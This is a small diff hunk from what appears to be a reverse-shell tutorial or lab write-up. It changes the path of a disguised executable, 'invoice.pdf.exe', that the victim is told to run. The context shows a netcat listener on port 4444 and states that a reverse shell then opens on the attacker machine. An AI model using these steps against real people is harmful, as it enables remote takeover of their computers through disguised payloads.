@@ -116,7 +116,7 @@ nc -lvnp 4444
 On the victim (PowerShell or CMD):
 
 ```cmd
-C:\Users\Public\invoice.pdf.exe
+C:\Users\ericn\Downloads\invoice.pdf.exe
 ```
 
 A reverse shell session is now active on the attacker machine.
